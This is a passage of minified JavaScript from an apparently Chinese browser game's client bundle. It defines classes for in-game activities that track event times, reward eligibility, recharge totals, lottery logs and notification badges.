i=0;e>i;i++)this.noticeArr.push({name:t.readString(),multiple:t.readDouble(),yb:t.readInt()});this.noticeArr.reverse()},e.prototype.canReward=function(){return this.checkRedPoint()},e.prototype.isOpenActivity=function(){var t=Math.floor((n.DateUtils.formatMiniDateTime(this.startTime)-a.GameServerCC.serverTime)/1e3),e=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-a.GameServerCC.serverTime)/1e3);return 0>t&&e>0?!0:!1},e.prototype.checkRedPoint=function(){return!1},e.prototype.getLeftTime=function(){if(this.endTime){var t=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-a.GameServerCC.serverTime)/1e3);return 0>t&&(t=0),t}return 0},e.prototype.getRemainTime=function(){var t,e=Math.floor((n.DateUtils.formatMiniDateTime(this.startTime)-a.GameServerCC.serverTime)/1e3),i=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-a.GameServerCC.serverTime)/1e3);return t=e>=0?gettext("活动未开启"):0>=i?gettext("活动已结束"):n.DateUtils.getFormatBySecond(i,n.DateUtils.TIME_FORMAT_5,3)},e.prototype.getLevel=function(){var t=o.GlobalConfig.ActivityType10Config[this.id],e=Object.keys(t).length,i=this.record+1;return this.record>=e&&(i=0),i},e.prototype.getCondition=function(t){var e=o.GlobalConfig.ActivityType10Config[this.id][t];return e&&this.yb>=e.recharge?!0:!1},e}(s.ActivityBaseData);e.ActivityType10Data=r,window.ActivityType10Data=r,__reflect(r.prototype,"ActivityType10Data",[]),window.ActivityType10Data=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ActivityType11Data=void 0;var n=i(8),o=i(17),s=i(0),a=i(7),r=i(9),l=i(33),h=i(56),u=function(t){function e(e,i,n,o,s){void 0===s&&(s=l.ActivityType.Normal);var a=t.call(this,e)||this;return a._rewardInfo=0,a.activityType=s,a.id=i,a.startTime=n,a.endTime=o,a.update(e),a.initRps(),a}return __extends(e,t),e.prototype.initRps=function(){var t=this;this.rp=new o.RedPoint(function(){if(!t.isOpenActivity())return!1;var e=s.GlobalConfig.ActivityType11_2Config[t.id];for(var i in e){var n=t.achieveInfo[e[i].index-1];if(n&&!n.isGot&&!e[i].maxCount&&!(t.getCurDay()<e[i].day)&&n.times>=e[i].dayLimit)return!0}return!1},r.Activity.ins().postRewardResult,r.Activity.ins().postActivityIsGetAwards)},e.prototype.update=function(t){this._rewardInfo=t.readInt(),this._hiScore=t.readInt();var e=t.readShort();t.readInt();this._achieveInfo=[];var i;i=s.GlobalConfig.ActivityType11_2Config,this._achieveInfo.length=Object.keys(i[this.id]).length;var n,o;for(n=0;e>n;n++){var a=t.readShort()-1,r=t.readInt(),l=t.readByte();this._achieveInfo[a]={times:r,isGot:!1,getCount:l},o=t.readByte()}e=this._achieveInfo.length;var h,u=this.getCurDay();for(n=0;e>n;n++){this._achieveInfo[n]||(this._achieveInfo[n]={times:0,isGot:!1,getCount:0}),h=i[this.id][n+1];var p=(null===h||void 0===h?void 0:h.maxCount)?this._achieveInfo[n].getCount>=h.maxCount:this._achieveInfo[n].getCount>0,d=(null===h||void 0===h?void 0:h.maxCount)?this._achieveInfo[n].getCount:this._achieveInfo[n].times;this._achieveInfo[n].times=d,this._achieveInfo[n].isGot=p,(!h.day||u>=h.day)&&(this._hiScore+=Math.floor(this._achieveInfo[n].times/h.target)*h.score)}},Object.defineProperty(e.prototype,"rewardInfo",{get:function(){return this._rewardInfo},enumerable:!1,configurable:!0}),e.prototype.getRewardState=function(t){var e;return e=s.GlobalConfig.ActivityType11Config,this.hiScore<e[this.id][t].score?0:0==(this.rewardInfo>>t&1)?1:2},Object.defineProperty(e.prototype,"hiScore",{get:function(){return this._hiScore},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"achieveInfo",{get:function(){return this._achieveInfo},enumerable:!1,configurable:!0}),e.prototype.canReward=function(){return this.checkRedPoint()},e.prototype.isOpenActivity=function(){var t=Math.floor((n.DateUtils.formatMiniDateTime(this.startTime)-a.GameServerCC.serverTime)/1e3),e=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-a.GameServerCC.serverTime)/1e3);return 0>t&&e>0?!0:!1},e.prototype.checkRedPoint=function(){var t,i;t=s.GlobalConfig.ActivityType11_2Config,i=r.Activity.ins();var n=s.GlobalConfig.ActivityConfig[this.id];if("SpringDayWin"==n.pageSkin){var o=s.GlobalConfig.ActivityType11Config[this.id];for(var a in o){var l=o[a].index;if(1==l&&1==this.getGroupRewardState(l)||l>1&&1==this.getGroupRewardState(l)&&this.getGroupRewardState(l-1)>=1)return!0}for(var a in t[this.id])if(1==this.getTaskState(t[this.id][a].index))return!0}else if(n.pageStyle==h.ActivityPageStyle.HAPPYSEVENDAY||n.pageStyle==h.ActivityPageStyle.SPRINGEIGHTDAY||n.pageStyle==h.ActivityPageStyle.VERSIONCELE){for(var u=Object.keys(t[this.id]).length,p=void 0,d=void 0,c=this.getCurDay(),a=1;u>=a;a++)if(p=t[this.id][a],d=this.achieveInfo[p.index-1],c>=(p.day||0)&&!d.isGot&&d.times>=p.target)return!0}else if(this.checkPhaseAward())return!0;if(n.pageStyle==h.ActivityPageStyle.VERSIONCELE){if(e.FIRST_OPEN_SHOP)return!0;if(this.checkPhaseAward())return!0;var f=0;for(var g in i.activityData){var m=i.activityData[g];if(m&&m.pageStyle==h.ActivityPageStyle.VERSIONCELE&&m.type==h.ActivityDataType._22&&r.Activity.ins().getActivityDataById(+g).isOpenActivity()&&!r.Activity.ins().getActivityDataById(+g).getHide()){if(f=m.id,m.refreshFree)return!0;
break}}}return!1},e.prototype.checkPhaseAward=function(){for(var t=s.GlobalConfig.ActivityType11Config[this.id],e=Object.keys(t).length,i=1;e>=i;i++){if((this._rewardInfo>>i&1)<=0&&this._hiScore>=t[i].score)return!0;if(0==t[i].rewardType&&1==this.getRewardState(t[i].index))return!0}return!1},e.prototype.getRemainTime=function(){var t,e=Math.floor((n.DateUtils.formatMiniDateTime(this.startTime)-a.GameServerCC.serverTime)/1e3),i=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-a.GameServerCC.serverTime)/1e3);return t=e>=0?gettext("活动未开启"):0>=i?gettext("活动已结束"):n.DateUtils.getFormatBySecond(i,n.DateUtils.TIME_FORMAT_5,3)},e.prototype.getCurDay=function(){var t=Math.floor((n.DateUtils.formatMiniDateTime(this.startTime)-a.GameServerCC.serverTime)/1e3),e=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-a.GameServerCC.serverTime)/1e3);return t>=0?0:0>=e?0:Math.ceil(Math.abs(t)/86400)},e.prototype.getCfg2ByGroup=function(t){var e=s.GlobalConfig.ActivityType11_2Config[this.id],i=[];for(var n in e)e[n].group==t&&i.push(e[n]);return i},e.prototype.getTaskState=function(t){var e=s.GlobalConfig.ActivityType11_2Config[this.id],i=this.achieveInfo[t-1];return i.isGot?2:i.times>=e[t].target?1:0},e.prototype.getGroupTaskFinishNum=function(t){var e=this.getCfg2ByGroup(t),i=0;for(var n in e)switch(this.getTaskState(e[n].index)){case 1:case 2:i++}return i},e.prototype.getGroupRewardState=function(t){if(1==(this.rewardInfo>>t&1))return 2;var e=this.getCfg2ByGroup(t),i=0;for(var n in e)switch(this.getTaskState(e[n].index)){case 1:case 2:i++}return i>=e.length?1:0},e.FIRST_OPEN_SHOP=!0,e}(l.ActivityBaseData);e.ActivityType11Data=u,window.ActivityType11Data=u,__reflect(u.prototype,"ActivityType11Data",[]),window.ActivityType11Data=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ActivityType13Data=void 0;var n=i(8),o=i(7),s=i(9),a=i(33),r=function(t){function e(e){var i=t.call(this,e)||this;return i.proCount=[0,0,0,0,0,0,0,0],i.awardCount=[0,0,0,0,0,0,0,0],i.count=0,i.playList=[],i.init(e),i}return __extends(e,t),e.prototype.init=function(t){this.count=t.readInt();for(var e=t.readShort(),i=0;e>i;i++){var n=t.readShort(),o=t.readShort(),a=this.awardCount[n],r=t.readByte();a!=r&&s.Activity.ins().postHuntResultFunc(),this.proCount[n]=o,this.awardCount[n]=r}},e.prototype.update=function(t){var e=(t.readShort(),t.readShort());this.playList=[];for(var i=0;e>i;i++){var n=t.readShort();this.proCount[n]=t.readShort(),-1==this.playList.indexOf(n)&&this.playList.push(n)}},e.prototype.canReward=function(){return this.checkRedPoint()},e.prototype.isOpenActivity=function(){var t=Math.floor((n.DateUtils.formatMiniDateTime(this.startTime)-o.GameServerCC.serverTime)/1e3),e=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-o.GameServerCC.serverTime)/1e3);return 0>t&&e>0?!0:!1},e.prototype.checkRedPoint=function(){return!1},e.prototype.getRemainTime=function(){var t,e=Math.floor((n.DateUtils.formatMiniDateTime(this.startTime)-o.GameServerCC.serverTime)/1e3),i=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-o.GameServerCC.serverTime)/1e3);return t=e>=0?gettext("活动未开启"):0>=i?gettext("活动已结束"):n.DateUtils.getFormatBySecond(i,n.DateUtils.TIME_FORMAT_5,3)},e}(a.ActivityBaseData);e.ActivityType13Data=r,window.ActivityType13Data=r,__reflect(r.prototype,"ActivityType13Data",[]),window.ActivityType13Data=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ActivityType18Data=void 0;var n=i(8),o=i(17),s=i(0),a=i(7),r=i(9),l=i(33),h=function(t){function e(e){var i=t.call(this,e)||this;return i.num=0,i.init(e),i.initRps(),i}return __extends(e,t),e.prototype.init=function(t){this.num=t.readInt(),this.recrod=t.readInt();var e=t.readShort();this.logs?this.logs.length=0:this.logs=[];for(var i=0;e>i;i++){var n=[t.readString(),t.readInt()];this.logs.push(n)}this.logs=this.logs.reverse(),this.bestlogs?this.bestlogs.length=0:this.bestlogs=[],e=t.readShort();for(var i=0;e>i;i++){var n=[t.readString(),t.readInt()];this.bestlogs.push(n)}},e.prototype.initRps=function(){var t=this;this.rp=new o.RedPoint(function(){return t.canReward()},r.Activity.ins().postRewardResult,r.Activity.ins().postHuntResultFunc,r.Activity.ins().postHuntResultPlayFunc,r.Activity.ins().postActivityIsGetAwards)},e.prototype.update=function(t){var e=t.readShort();this.num=t.readInt(),this.recrod=t.readInt();for(var i=t.readShort(),n=[],o=0;i>o;o++)n[o]=[t.readInt(),t.readShort()];var s=0;2==e&&(s=1),win.get("HuntResultWin")?r.Activity.ins().postHuntResult(s,n,3,this.id):(win.open("HuntResultWin",s,n,3,this.id),r.Activity.ins().postHuntResult(s,n,3,this.id))},e.prototype.isOpenActivity=function(){var t=Math.floor((n.DateUtils.formatMiniDateTime(this.startTime)-a.GameServerCC.serverTime)/1e3),e=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-a.GameServerCC.serverTime)/1e3);return 0>t&&e>0?!0:!1},e.prototype.getLeftTime=function(){var t=Math.floor((n.DateUtils.formatMiniDateTime(this.startTime)-a.GameServerCC.serverTime)/1e3),e=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-a.GameServerCC.serverTime)/1e3),i="";return i=t>=0?gettext("活动未开启"):0>=e?gettext("活动已结束"):n.DateUtils.getFormatBySecond(e,n.DateUtils.TIME_FORMAT_5,4)},e.prototype.canReward=function(){return this.checkRedPoint()},e.prototype.getStateByIndex=function(t){var e=this.recrod>>t&1;if(0==e){var i=s.GlobalConfig.ActivityType18Config[this.id][t];i&&i.dbCount&&i.dbCount<=this.num&&(e=2)}return e},e.prototype.checkRedPoint=function(){var t=s.GlobalConfig.ActivityType18Config[this.id][0].relateActivityId,e=r.Activity.ins().getActivityDataById(t),i=s.GlobalConfig.ActivityType13Config[t];if(!e||!i)return!1;for(var n in i){var o=e.awardCount[n],a=e.proCount[n],l=i[n].count;if(0==o&&a/l==1)return!0}return!1},e}(l.ActivityBaseData);e.ActivityType18Data=h,window.ActivityType18Data=h,__reflect(h.prototype,"ActivityType18Data",[]),window.ActivityType18Data=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ActivityType19Data=void 0;var n=i(8),o=i(0),s=i(7),a=i(9),r=i(33),l=function(t){function e(e){var i=t.call(this,e)||this;return i.awardIndex=0,i._data={},i._list=[],i.data={},i.list=[],i}return __extends(e,t),e.prototype.CleanRandData=function(){this._data={},this._list=[],this.data={},this.list=[]},e.prototype.SetRankData=function(t){this._list[t.rank-1]=t},e.prototype.SetQRankData=function(t){this.list[t.rank-1]=t,this.data[t.actorId]=t},e.prototype.GetRankData=function(){return this._data},e.prototype.GetRankList=function(){return this._list},e.prototype.GetQRankList=function(){return this.list},e.prototype.update=function(t){},e.prototype.canReward=function(){return this.checkRedPoint()},e.prototype.isOpenActivity=function(){var t=Math.floor((n.DateUtils.formatMiniDateTime(this.startTime)-s.GameServerCC.serverTime)/1e3),e=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-s.GameServerCC.serverTime)/1e3);return 0>t&&e>0?!0:!1},e.prototype.getleftTime=function(){if(!this.isOpenActivity())return 0;var t=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-s.GameServerCC.serverTime)/1e3);return t},e.prototype.checkRedPoint=function(){var t=o.GlobalConfig.ActivityType19Config[this.id][1];if(t.activityID){var e=a.Activity.ins().getActivityDataById(t.activityID);if(e&&e.canReward())return!0}return!1},e}(r.ActivityBaseData);e.ActivityType19Data=l,window.ActivityType19Data=l,__reflect(l.prototype,"ActivityType19Data",[]),window.ActivityType19Data=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ActivityType22Data=void 0;var n=i(8),o=i(7),s=i(33),a=function(t){function e(e){var i=t.call(this,e)||this;return i.shopItems=[],i.scoreItems=[],i.limitItems=[],i._refreshTime=0,i.update(e),i}return __extends(e,t),e.prototype.update=function(t){},e.prototype.canReward=function(){return this.checkRedPoint()},e.prototype.isOpenActivity=function(){var t=Math.floor((n.DateUtils.formatMiniDateTime(this.startTime)-o.GameServerCC.serverTime)/1e3),e=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-o.GameServerCC.serverTime)/1e3);return 0>t&&e>0?!0:!1},e.prototype.getleftTime=function(){if(!this.isOpenActivity())return 0;var t=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-o.GameServerCC.serverTime)/1e3);return t},e.prototype.checkRedPoint=function(){return this.refreshFree?!0:!1},e.prototype.getRemainTime=function(){var t,e=Math.floor((n.DateUtils.formatMiniDateTime(this.startTime)-o.GameServerCC.serverTime)/1e3),i=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-o.GameServerCC.serverTime)/1e3);return t=e>=0?gettext("活动未开启"):0>=i?gettext("活动已结束"):n.DateUtils.getFormatBySecond(i,n.DateUtils.TIME_FORMAT_5,3)},e.prototype.getRefreshTime=function(){return this._refreshTime-(egret.getTimer()-this._oldTimer)/1e3},e}(s.ActivityBaseData);e.ActivityType22Data=a,window.ActivityType22Data=a,__reflect(a.prototype,"ActivityType22Data",[]),window.ActivityType22Data=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Show3Type=e.Activity3Type=e.ActivityType3Data=void 0;var n=i(33),o=i(0),s=i(9),a=i(8),r=i(7),l=i(17),h=function(t){function e(e){var i=t.call(this,e)||this;return i.dabiao=[],i.chongzhiNum=0,i.chongzhiTotal=0,i.btn1=!1,i.btn2=!1,i.image1=!1,i.image2=!1,i.subtype=e.readByte(),i.subtype==u.TYPE4?(i.cumdays=e.readInt(),i.awardays=e.readInt()):i.updateData(e),i.initRps(),i}return __extends(e,t),e.prototype.initRps=function(){var t=this;this.rp=new l.RedPoint(function(){if(!t.isOpenActivity())return!1;var e=o.GlobalConfig.ActivityType3Config[t.id];if(!e)return!1;if(t.subtype==u.TYPE4){for(var i in e)if(!(t.awardays<e[i].index)&&t.cumdays>=e[i].index)return!0;return!1}if(e[1].showType==p.TYPE10){var n=[];n.push(t.id);var a=o.GlobalConfig.ActivityType3Config[t.id];if(!a[1]||!a[1].activityID)return!1;for(var r=1;r<=a[1].activityID.length;r++)n.push(a[1].activityID[r-1]);for(var r=0;3>r;r++){var l=n[r],h=void 0,d=void 0,c=void 0,f=void 0,g=s.Activity.ins().getActivityDataById(l);if(!g)return!1;var m=o.GlobalConfig.ActivityType3Config[l];for(var v in m)if(c=(g.recrod||0)>>m[v].index&1?!0:!1,f=m[v].type,3==f?(d=t.isOverTimer(m[v].index),h=t.curOpenDay()+1==m[v].day&&t.chongzhiNum>=m[v].val?!0:!1):1==f&&(d=g.dabiao[m[v].index-1]<m[v].day,h=!c&&!d),d?c=h=!1:h=c?!1:h,h)return!0}return!1}for(var y in e){var m=e[y],C=2==m.type?t.chongzhiTotal>=m.val:t.dabiao[m.index-1]>=m.index,T=(t.recrod>>m.index&1)==s.Activity.CanGet;if(C&&!T)return!0}return!1},s.Activity.ins().postRewardResult,s.Activity.ins().postChangePage,s.Activity.ins().postActivityIsGetAwards)},e.prototype.update=function(e){t.prototype.update.call(this,e);e.readShort();this.recrod=e.readInt()},e.prototype.openDay=function(){var t=o.GlobalConfig.ActivityType3Config[this.id];return t&&t[0]?t[0].day:7},e.prototype.canRewardById=function(t){var e=o.GlobalConfig.ActivityType3Config[this.id][t];if((this.dabiao[t-1]||0)>=e.day){var i=this.recrod>>t&1;return 0==i?1:2}return 0},e.prototype.canReward=function(){if(this.subtype==u.TYPE4)return this.awardays<this.cumdays;var t=o.GlobalConfig.ActivityType3Config[this.id],e=this.recrod,i=-1,n=0;for(var s in t){var a=e>>t[s].index&1;if(1==t[s].type){if(this.dabiao[n]>=t[s].day&&0==a)return!0}else if(2==t[s].type&&t[s].val<=this.chongzhiTotal){if(0==a)return!0}else if(3==t[s].type&&t[s].val<=this.chongzhiNum&&(-1==i&&(i=this.getCurIndex(3)),i==t[s].index&&0==a))return!0;n++}return this.canRewardEx()},e.prototype.isOpenActivity=function(){var t=Math.floor((a.DateUtils.formatMiniDateTime(this.startTime)-r.GameServerCC.serverTime)/1e3),e=Math.floor((a.DateUtils.formatMiniDateTime(this.endTime)-r.GameServerCC.serverTime)/1e3);return 0>t&&e>0?!0:!1},e.prototype.updateData=function(t){var e=t.readShort();this.dabiao=[];for(var i=0;e>i;i++)this.dabiao.push(t.readShort());this.chongzhiNum=t.readInt(),this.chongzhiTotal=t.readInt(),this.recrod=t.readInt()},Object.defineProperty(e.prototype,"day7text",{get:function(){var t=o.GlobalConfig.ActivityType3Config[this.id];for(var e in t)1==t[e].type&&(this.rewards1=t[e].rewards,this._day7text=gettext("累计{0}天，每日充值{1}元宝可领取","<font color='#ffff00'>"+t[e].day+"</font>","<font color='#ffff00'>"+t[e].val+"</font>"));return this._day7text},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"totaltext",{get:function(){var t=o.GlobalConfig.ActivityType3Config[this.id];for(var e in t)2==t[e].type&&(this.maxTotal=t[e].val,this.rewards2=t[e].rewards,this._totaltext=gettext("活动期间累计充值{0}元宝可领取","<font color='#ffff00'>"+t[e].val+"</font>"));return this._totaltext},enumerable:!1,configurable:!0}),e.prototype.canOnlyReward=function(){var t=o.GlobalConfig.ActivityType3Config[this.id],e=this.recrod;this.btn1=!1,this.btn2=!1,this.image1=!1,this.image2=!1;for(var i in t){var n=e>>t[i].index&1;1==t[i].type&&this.dabiao&&this.dabiao[0]>=t[i].day&&(0==n&&(this.btn1=!0),1==n&&(this.image1=!0)),2==t[i].type&&t[i].val<=this.chongzhiTotal&&(0==n&&(this.btn2=!0),1==n&&(this.image2=!0))}},e.prototype.getDateTime=function(t){var e=t.split(/[-,.,:]/g),i=new Date(+e[0],+e[1]-1,+e[2],+e[3]||0,+e[4]||0);return i.getTime()},e.prototype.isOverTimer=function(t){var e=this.curOpenDay(),i=o.GlobalConfig.ActivityType3Config[this.id][t],n=this.recrod>>i.index&1;return e+1>i.day&&n!=s.Activity.Geted?!0:!1},e.prototype.curOpenDay=function(){var t=o.GlobalConfig.ActivityConfig[this.id],e=0;if(0==t.timeType){var i=+t.startTime.split("-")[0];e=r.GameServerCC.serverOpenDay-i}else if(1==t.timeType){var i=r.GameServerCC.serverTime,n=a.DateUtils.formatMiniDateTime(this.startTime);e=Math.floor((i-n)/1e3/3600/24)}else if(2==t.timeType){var i=+t.startTime.split("-")[0],n=Math.floor((r.GameServerCC.serverTime-a.DateUtils.formatMiniDateTime(r.GameServerCC._serverHeZeroTime))/1e3/3600/24);e=n-i}return e},e.prototype.getCurIndex=function(t){var e=(o.GlobalConfig.ActivityConfig[this.id],o.GlobalConfig.ActivityType3Config[this.id]),i=this.curOpenDay(),n={};for(var s in e)n[e[s].type]=1;var a=Object.keys(n);(1==a.length||void 0==t)&&(t=+a[0]);var r,l=[];for(r in e)e[r].type==t&&l.push(e[r]);l.sort(function(t,e){return t.day<e.day?-1:1});for(var h=0,u=l;h<u.length;h++){var p=u[h];if(r=p.index,1==t||2==t){if(i<p.day)return+r}else if(3==t&&i<p.day)return+r}return+r},e.prototype.getLeftTime=function(){if(this.endTime){var t=Math.floor((a.DateUtils.formatMiniDateTime(this.endTime)-r.GameServerCC.serverTime)/1e3);return 0>t&&(t=0),t}return 0},e.prototype.getRewardStateById=function(t){var e=o.GlobalConfig.ActivityType3Config[this.id][t];switch(e.showType){case p.TYPE6:case p.TYPE8:case p.TYPE9:if(this.chongzhiTotal<e.val)return s.Activity.NotReached;break;case p.TYPE7:case p.TYPE11:if(this.dabiao[t-1]<e.day)return s.Activity.NotReached;break;case p.TYPE15:if(this.chongzhiNum<e.val)return s.Activity.NotReached}var i=this.recrod>>e.index&1;return i?s.Activity.Geted:s.Activity.CanGet},e.prototype.canRewardEx=function(){var t=o.GlobalConfig.ActivityType3Config[this.id];if(t&&t[1]&&t[1].activityID)for(var e=0;e<t[1].activityID.length;e++){var i=s.Activity.ins().getActivityDataById(t[1].activityID[e]);if(i&&i.canReward())return!0}return!1},e.prototype.getRemainTime=function(){var t,e=Math.floor((a.DateUtils.formatMiniDateTime(this.startTime)-r.GameServerCC.serverTime)/1e3),i=Math.floor((a.DateUtils.formatMiniDateTime(this.endTime)-r.GameServerCC.serverTime)/1e3);return t=e>=0?gettext("活动未开启"):0>=i?gettext("活动已结束"):a.DateUtils.getFormatBySecond(i,a.DateUtils.TIME_FORMAT_5,3)},__decorate([post()],e.prototype,"updateData",null),e}(n.ActivityBaseData);e.ActivityType3Data=h,window.ActivityType3Data=h,__reflect(h.prototype,"ActivityType3Data",[]);var u;!function(t){t[t.TYPE4=4]="TYPE4"}(u=e.Activity3Type||(e.Activity3Type={})),window.Activity3Type=u;var p;!function(t){t[t.TYPE1=1]="TYPE1",t[t.TYPE2=2]="TYPE2",t[t.TYPE3=3]="TYPE3",t[t.TYPE4=4]="TYPE4",t[t.TYPE5=5]="TYPE5",t[t.TYPE6=6]="TYPE6",t[t.TYPE7=7]="TYPE7",t[t.TYPE8=8]="TYPE8",t[t.TYPE9=9]="TYPE9",t[t.TYPE10=10]="TYPE10",t[t.TYPE11=11]="TYPE11",t[t.TYPE15=15]="TYPE15"}(p=e.Show3Type||(e.Show3Type={})),window.Show3Type=p,window.Activity3Type=u,window.Show3Type=p,window.ActivityType3Data=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ActivityType40Data=void 0;var n=i(8),o=i(0),s=i(6),a=i(10),r=i(7),l=i(519),h=i(9),u=i(33),p=function(t){function e(e){var i=t.call(this,e)||this;return i.score=0,i.exchangeNums={},i.job=["",gettext("战士"),gettext("法师"),gettext("道士"),gettext("刺客"),gettext("弓手")],i.lottery=0,i.update(e),i}return __extends(e,t),e.prototype.update=function(t){this.lottery=t.readInt(),this.score=t.readUnsignedInt();var e=t.readUnsignedByte();this.exchangeNums={};for(var i=0;e>i;i++)this.exchangeNums[t.readUnsignedByte()]=t.readUnsignedByte();e=t.readUnsignedByte(),this.logs=[];for(var i=0;e>i;i++){var n=t.readString(),s=t.readInt(),r=(t.readInt(),o.GlobalConfig.ItemConfig[s]),l=void 0,h=a.ItemUtil.getQuality2(r),u=a.ItemUtil.getType(r);l=0==u?"<font color = '#12b2ff'>"+n+"</font> "+gettext("获得")+"<font color='"+h+"'>"+this.makeNameList(r)+"</font>":"<font color = '#12b2ff'>"+n+"</font> "+gettext("获得")+"<font color='"+h+"'>"+r.name+"</font>",this.logs.push(l)}},e.prototype.makeNameList=function(t){var e=t.name;return e+=t.zsLevel>0?"("+t.zsLevel+gettext("转 "):"("+t.level+gettext("级 "),e+=this.job[a.ItemUtil.getJob(t)]+")"},e.prototype.postRewardResult=function(t){var i=t.readUnsignedShort(),n=t.readUnsignedShort();e.RewardResultId[this.id]=n>1?0:i,e.RewardResultItem=null,this.awards=[];for(var o=0;n>o;o++)t.readUnsignedByte(),this.awards[o]=[t.readInt(),t.readInt()],e.RewardResultItem||(e.RewardResultItem=this.awards[o]);e.ShowRoll?Timer.start(n>1?2e3:4e3,1,this.showRewards,this):this.showRewards()},e.prototype.showRewards=function(){(this.awards.length>1||2==o.GlobalConfig.ActivityType40Config[this.id][1].showType)&&(win.open(l.HuntResultWin,this.awards.length>1?10:0,this.awards,4,this.id),h.Activity.ins().postHuntResult(this.awards.length>1?10:0,this.awards,4,this.id))},e.prototype.canReward=function(){var t=o.GlobalConfig.ActivityType40Config[this.id][1],e=s.BagCT.ins().getBagGoodsCountById(s.BagCT.BAG_TYPE_OTHTER,t.itemId);return e>=10?!0:this.scoreReward()||this.lotteryReward()},e.prototype.lotteryReward=function(){var t=o.GlobalConfig.ActivityType40_1Config[this.id];for(var e in t){var i=t[e];if(i.lotteryCount&&this.exchangeNums[i.index]<i.count&&this.lottery>=i.lotteryCount)return!0}return!1},e.prototype.scoreReward=function(){var t=o.GlobalConfig.ActivityType40_1Config[this.id];for(var e in t){var i=t[e];if(i.score&&this.exchangeNums[i.index]<i.count&&this.score>=i.score)return!0}return!1},e.prototype.getStateByIndex=function(t){var e=this.exchangeNums[t];if(0==e){var i=o.GlobalConfig.ActivityType40_1Config[this.id][t];i&&i.lotteryCount&&(e=this.lottery>=i.lotteryCount?1:0)}else e=2;return e},e.prototype.isOpenActivity=function(){var t=Math.floor((n.DateUtils.formatMiniDateTime(this.startTime)-r.GameServerCC.serverTime)/1e3),e=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-r.GameServerCC.serverTime)/1e3);return 0>t&&e>0?!0:!1},e.prototype.getRemainTime=function(){var t,e=Math.floor((n.DateUtils.formatMiniDateTime(this.startTime)-r.GameServerCC.serverTime)/1e3),i=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-r.GameServerCC.serverTime)/1e3);return t=e>=0?gettext("活动未开启"):0>=i?gettext("活动已结束"):n.DateUtils.getFormatBySecond(i,n.DateUtils.TIME_FORMAT_5,3)},e.RewardResultId=[],e.ShowRoll=!1,__decorate([post()],e.prototype,"postRewardResult",null),e}(u.ActivityBaseData);e.ActivityType40Data=p,window.ActivityType40Data=p,__reflect(p.prototype,"ActivityType40Data",[]),window.ActivityType40Data=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ActivityType42Data=void 0;var n=i(8),o=i(17),s=i(0),a=i(7),r=i(9),l=i(33),h=function(t){function e(e){var i=t.call(this,e)||this;return i.update(e),i.initRps(),i}return __extends(e,t),e.prototype.update=function(t){var e=t.readShort();this.achieveInfo=[];for(var i=0;e>i;i++)this.achieveInfo[t.readShort()]={times:t.readInt(),isGot:t.readBoolean(),gotTimes:t.readInt()}},e.prototype.initRps=function(){var t=this;this.rp=new o.RedPoint(function(){var e=s.GlobalConfig.ActivityType42Config[t.id];for(var i in e){var n=e[i],o=t.getAchieveInfo(n.index);if(o&&!o.isGot&&o.times>=n.target)return!0}return!1},r.Activity.ins().postRewardResult,r.Activity.ins().postChangePage,r.Activity.ins().postActivityIsGetAwards)},e.prototype.getAchieveInfo=function(t){return this.achieveInfo[t]},e.prototype.getStatus=function(t){var e=s.GlobalConfig.ActivityType42Config[this.id],i=e[t],n=this.getAchieveInfo(t);return n?n.isGot?2:n.times>=i.target?1:0:0},e.prototype.groupCanReward=function(t){var e=s.GlobalConfig.ActivityType42Config[this.id];for(var i in e)if(e[i].group==t){var n=this.achieveInfo[e[i].index];if(n&&n.times>=e[i].target&&!n.isGot)return!0}return!1},e.prototype.canReward=function(){var t=s.GlobalConfig.ActivityType42Config[this.id];for(var e in t){var i=this.achieveInfo[t[e].index];if(i&&i.times>=t[e].target&&!i.isGot)return!0}return!1},e.prototype.isOpenActivity=function(){var t=Math.floor((n.DateUtils.formatMiniDateTime(this.startTime)-a.GameServerCC.serverTime)/1e3),e=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-a.GameServerCC.serverTime)/1e3);return 0>t&&e>0?!0:!1},e.prototype.getRemainTime=function(){var t,e=Math.floor((n.DateUtils.formatMiniDateTime(this.startTime)-a.GameServerCC.serverTime)/1e3),i=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-a.GameServerCC.serverTime)/1e3);return t=e>=0?gettext("活动未开启"):0>=i?gettext("活动已结束"):n.DateUtils.getFormatBySecond(i,n.DateUtils.TIME_FORMAT_5,3)},e}(l.ActivityBaseData);e.ActivityType42Data=h,window.ActivityType42Data=h,__reflect(h.prototype,"ActivityType42Data",[]),window.ActivityType42Data=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ActivityType49Data=void 0;var n=i(8),o=i(0),s=i(7),a=i(33),r=function(t){function e(e){var i=t.call(this,e)||this;return i.update(e),i}return 